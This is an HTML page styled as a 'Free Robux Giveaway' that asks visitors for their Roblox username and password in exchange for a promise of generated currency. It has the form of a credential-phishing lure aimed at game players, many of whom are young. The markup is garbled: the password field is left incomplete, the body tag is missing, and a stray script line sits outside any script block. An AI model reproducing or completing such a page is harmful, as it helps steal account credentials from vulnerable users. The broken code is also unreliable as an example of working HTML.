<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Free Robux Giveaway</title>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap");

      :root {
        --primary-color: #2ecc71;
        --primary-hover: #27ae60;
        --bg-dark: #0d1117;
        --card-bg: #161b22;
        --input-bg: #1c2128;
        --input-focus: #222a33;
        --modal-bg: #222a33;
        --error-color: #e74c3c;
        --glow-color: rgba(0, 255, 0, 0.3);
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Poppins", sans-serif;
      }

      body {
        background: var(--bg-dark);
        color: white;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      .container {
        background: var(--card-bg);
        padding: 30px;
        border-radius: 16px;
        width: 100%;
        max-width: 400px;
        box-shadow: 0px 0px 15px var(--glow-color);
        transition: all 0.3s ease;
      }

      .disclaimer {
        font-size: 12px;
        opacity: 0.7;
        margin-top: 15px;
        text-align: center;
      }

      h1 {
        color: var(--primary-color);
        font-size: 24px;
        margin-bottom: 20px;
        text-align: center;
      }

      .input-group {
        margin-bottom: 16px;
      }

      label {
        display: block;
        text-align: left;
        margin-bottom: 6px;
        font-size: 14px;
        opacity: 0.9;
      }

      input {
        width: 100%;
        padding: 14px;
        font-size: 16px;
        border-radius: 8px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        outline: none;
        background: var(--input-bg);
        color: white;
        transition: all 0.3s ease;
      }

      input:focus {
        background: var(--input-focus);
        box-shadow: 0px 0px 8px var(--glow-color);
        border-color: var(--primary-color);
      }

      button {
        width: 100%;
        background: var(--primary-color);
        color: white;
        border: none;
        padding: 14px;
        cursor: pointer;
        font-size: 16px;
        border-radius: 8px;
        font-weight: bold;
        transition: all 0.3s ease;
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 8px;
      }

      button:hover {
        background: var(--primary-hover);
        box-shadow: 0px 0px 10px var(--glow-color);
        transform: translateY(-2px);
      }

      button:active {
        transform: translateY(0);
      }

      .modal-backdrop {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.7);
        backdrop-filter: blur(4px);
        z-index: 100;
      }

      .modal {
        display: none;
        position: fixed;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        background: var(--modal-bg);
        padding: 25px;
        border-radius: 16px;
        box-shadow: 0px 0px 20px var(--glow-color);
        width: 90%;
        max-width: 320px;
        text-align: center;
        z-index: 101;
        animation: fadeIn 0.3s ease-in-out;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translate(-50%, -55%);
        }
        to {
          opacity: 1;
          transform: translate(-50%, -50%);
        }
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .modal p {
        font-size: 18px;
        color: var(--primary-color);
        font-weight: bold;
        margin-bottom: 20px;
      }

      .close-btn {
        width: 100%;
        background: var(--error-color);
        padding: 12px;
        border: none;
        color: white;
        cursor: pointer;
        font-size: 16px;
        border-radius: 8px;
        transition: all 0.3s ease;
      }

      .close-btn:hover {
        background: #c0392b;
        box-shadow: 0px 0px 10px rgba(255, 0, 0, 0.5);
      }

      .loader {
        border: 3px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top: 3px solid var(--primary-color);
        width: 20px;
        height: 20px;
        animation: spin 1s linear infinite;
        display: none;
      }

      /* Responsive adjustments */
      @media (max-width: 480px) {
        .container {
          padding: 20px;
        }

        h1 {
          font-size: 20px;
        }

        input,
        button {
          padding: 12px;
          font-size: 14px;
        }
      }
    </style>
  </head>

    <main>
      <div class="container">
        <h1>🚀 Free Robux Giveaway</h1>

        <div class="input-group">
          <label for="username">Roblox Username</label>
          <input type="text" id="username" placeholder="Enter your username" />
        </div>

        <div class="input-group">
          <label for="password">Roblox Password</label>

            type="password"

        <button id="generateBtn" onclick="generateRobux()">
          <div class="loader" id="btnLoader"></div>
          <span id="btnText">Generate Now</span>
        </button>
      </div>
    </main>

    <div class="modal-backdrop" id="modalBackdrop"></div>
    <div class="modal" id="successModal">
      <p id="modalText"></p>
      <button class="close-btn" onclick="closeModal()">Close</button>
    </div>

          backdrop.style.display = "block";
